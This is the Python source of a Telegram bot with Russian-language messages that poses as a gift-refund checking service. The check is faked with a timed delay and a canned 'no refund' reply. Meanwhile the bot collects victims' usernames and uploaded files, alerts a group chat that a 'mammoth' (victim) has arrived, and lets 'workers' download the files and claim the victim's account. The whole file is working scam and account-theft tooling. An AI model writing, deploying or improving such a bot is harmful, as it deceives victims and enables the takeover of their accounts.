import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiohttp import web

# 🔑 Все настройки через переменные окружения
BOT_TOKEN = os.getenv("BOT_TOKEN")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID")  # ID вашей группы
PORT = int(os.getenv("PORT", 10000))
RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL")  # Для keep-alive

if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN не найден!")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Словарь для хранения данных пользователей
user_data = {}  # {username: {"chat_id": int, "files": [file_id]}}

# -------------------------------
# /start
# -------------------------------
@dp.message(Command("start"))
async def start(message: types.Message):
    text = (
        "Привет! Добро пожаловать в бота для проверки подарков.\n\n"
        "1. Скопируйте свой username без @\n"
        "2. Отправьте username в этот чат."
    )
    await message.answer(text)

# -------------------------------
# Получение username
# -------------------------------
@dp.message(lambda m: not m.text.startswith("/") and m.text.isalnum())
async def receive_username(message: types.Message):
    username = message.text.lower()
    user_data[username] = {"chat_id": message.chat.id, "files": []}
    await message.answer("✅ Username получен!")

    if GROUP_CHAT_ID:
        await bot.send_message(GROUP_CHAT_ID, f"Мамонт отправил свой username!")

# -------------------------------
# Получение файлов
# -------------------------------
@dp.message(lambda m: m.document)
async def receive_file(message: types.Message):
    username = None
    for u, data in user_data.items():
        if data["chat_id"] == message.chat.id:
            username = u
            break
    
    if not username:
        await message.answer("❌ Сначала отправьте свой username!")
        return
    
    file_id = message.document.file_id
    user_data[username]["files"].append(file_id)
    
    await message.answer(
        "Файл получен! Проверка запущена...\nОжидание до 10 секунд."
    )
    
    await asyncio.sleep(4)
    await message.answer("Проверка завершена! На подарках нет рефаунда.")

# -------------------------------
# Команда /chek username
# -------------------------------
@dp.message(Command("chek"))
async def chek_command(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        await message.answer("Используйте: /chek username")
        return
    
    target_username = args[1].lower()
    if target_username not in user_data:
        await message.answer("Пользователь не найден.")
        return
    
    files = user_data[target_username]["files"]
    if not files:
        await message.answer("У пользователя нет загруженных файлов.")
        return
    
    for file_id in files:
        await message.answer_document(file_id)
    
    if GROUP_CHAT_ID:
        worker = message.from_user.username or message.from_user.id
        await bot.send_message(
            GROUP_CHAT_ID,
            f"Воркер {worker} получил аккаунт {target_username}"
        )

# -------------------------------
# Веб-сервер для keep-alive
# -------------------------------
async def handle_root(request):
    return web.Response(text="Cherry Deals bot is alive!")

async def start_web_server():
    app = web.Application()
    app.add_routes([web.get("/", handle_root)])
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"🌐 Web server running on port {PORT}")

# -------------------------------
# Запуск бота
# -------------------------------
async def main():
    import traceback
    import aiohttp
    
    async def keep_alive():
        if not RENDER_EXTERNAL_URL:
            print("⚠️ RENDER_EXTERNAL_URL не найден, keep-alive не активен.")
            return
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get(RENDER_EXTERNAL_URL) as resp:
                        print(f"Keep-alive ping: {resp.status}")
                except Exception as e:
                    print("⚠️ Ошибка keep-alive:", e)
                await asyncio.sleep(300)
    
    async def run_bot():
        while True:
            try:
                print("✅ Bot is running...")
                await dp.start_polling(bot)
            except Exception as e:
                print("⚠️ Ошибка:", e)
                traceback.print_exc()
                print("♻️ Перезапуск через 5 секунд...")
                await asyncio.sleep(5)
    
    await asyncio.gather(start_web_server(), run_bot(), keep_alive())

if __name__ == "__main__":
    asyncio.run(main())
